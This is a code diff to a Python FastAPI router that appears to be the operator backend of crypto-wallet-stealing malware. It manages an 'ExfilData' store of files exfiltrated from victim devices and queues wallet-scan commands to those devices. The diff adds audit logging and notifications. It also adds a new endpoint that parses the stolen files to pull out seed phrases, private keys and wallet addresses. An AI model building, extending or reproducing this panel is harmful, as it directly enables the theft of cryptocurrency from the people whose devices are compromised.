@@ -1,10 +1,11 @@
-from fastapi import APIRouter, Depends, HTTPException, Query
+from fastapi import APIRouter, Depends, HTTPException, Query, Request
 from fastapi.responses import FileResponse
 from sqlalchemy.orm import Session
 from sqlalchemy import desc
 from pathlib import Path
-from ..database import get_db, ExfilData
+from ..database import get_db, ExfilData, create_audit_log
 from ..auth import get_current_user
+from .notifications import broadcast_notification_sync
 from typing import Optional, List
 
 router = APIRouter(prefix="/api/wallets", tags=["wallets"])
@@ -51,7 +52,9 @@ async def get_wallets(
         query = query.filter(ExfilData.device_uuid.contains(device_uuid))
     if wallet_type:
         query = query.filter(ExfilData.description.contains(wallet_type))
-    return query.offset(skip).limit(limit).all()
+    total = query.count()
+    items = query.offset(skip).limit(limit).all()
+    return {"total": total, "items": items}
 
 
 @router.get("/stats")
@@ -120,6 +123,7 @@ async def download_wallet_data(
 
 @router.delete("/{wallet_id}")
 async def delete_wallet(
+    request: Request,
     wallet_id: int,
     db: Session = Depends(get_db),
     current_user=Depends(get_current_user)
@@ -128,18 +132,26 @@ async def delete_wallet(
     wallet = db.query(ExfilData).filter(ExfilData.id == wallet_id).first()
     if not wallet:
         raise HTTPException(status_code=404, detail="Wallet data not found")
-    
+
     file_path = Path(wallet.file_path)
     if file_path.exists():
         file_path.unlink()
-    
+
     db.delete(wallet)
     db.commit()
+
+    username = current_user.username if current_user else "anonymous"
+    create_audit_log(
+        db, username=username, action="wallet_delete", resource_type="wallet",
+        resource_id=wallet_id, detail=f"Deleted wallet data {wallet_id} (device: {wallet.device_uuid})",
+        ip_address=request.client.host if request.client else None
+    )
     return {"message": "Wallet data deleted"}
 
 
 @router.post("/scan")
 async def scan_wallets(
+    request: Request,
     device_uuid: str,
     db: Session = Depends(get_db),
     current_user=Depends(get_current_user)
@@ -147,7 +159,7 @@ async def scan_wallets(
     """触发设备钱包扫描命令"""
     from ..database import Command
     from datetime import datetime
-    
+
     # 创建扫描命令
     commands = []
     for wtype, winfo in WALLET_TYPES.items():
@@ -158,13 +170,81 @@ async def scan_wallets(
         )
         db.add(cmd)
         commands.append(wtype)
-    
+
     db.commit()
-    
+
+    username = current_user.username if current_user else "anonymous"
+    create_audit_log(
+        db, username=username, action="wallet_scan", resource_type="wallet",
+        detail=f"Triggered wallet scan for device {device_uuid}, {len(commands)} wallet types",
+        ip_address=request.client.host if request.client else None
+    )
+    broadcast_notification_sync(
+        db, title="钱包扫描已触发", message=f"用户 {username} 对设备 {device_uuid} 发起了钱包扫描",
+        category="wallet", related_device_uuid=device_uuid, related_resource_type="wallet"
+    )
+
     return {
         "message": f"已发送{len(commands)}个钱包扫描命令",
         "wallet_types": commands
     }
+
+
+@router.get("/parsed")
+async def get_parsed_wallets(
+    db: Session = Depends(get_db),
+    current_user=Depends(get_current_user)
+):
+    """获取已成功解析助记词的钱包"""
+    wallets = db.query(ExfilData).filter(ExfilData.category == 'wallet').all()
+    parsed = []
+    
+    for wallet in wallets:
+        file_path = Path(wallet.file_path)
+        if not file_path.exists():
+            continue
+        
+        try:
+            content = file_path.read_text(encoding='utf-8', errors='ignore')
+            
+            mnemonic = None
+            private_key = None
+            address = None
+            
+            if content.startswith('{'):
+                import json
+                try:
+                    data = json.loads(content)
+                    mnemonic = data.get('mnemonic') or data.get('seed') or data.get('phrase')
+                    private_key = data.get('privateKey') or data.get('private_key')
+                    address = data.get('address') or data.get('walletAddress')
+                except:
+                    pass
+            
+            if not mnemonic:
+                words = content.split()
+                if 12 <= len(words) <= 24:
+                    import re
+                    word_pattern = re.compile(r'^[a-z]{3,8}$')
+                    potential_words = [w for w in words if word_pattern.match(w)]
+                    if 12 <= len(potential_words) <= 24:
+                        mnemonic = ' '.join(potential_words)
+            
+            if mnemonic:
+                parsed.append({
+                    "id": wallet.id,
+                    "device_uuid": wallet.device_uuid,
+                    "path": wallet.path,
+                    "description": wallet.description,
+                    "uploaded_at": wallet.uploaded_at,
+                    "mnemonic": mnemonic,
+                    "private_key": private_key,
+                    "address": address
+                })
+        except Exception:
+            continue
+    
+    return parsed
 
 
 @router.get("/mnemonic/{wallet_id}")
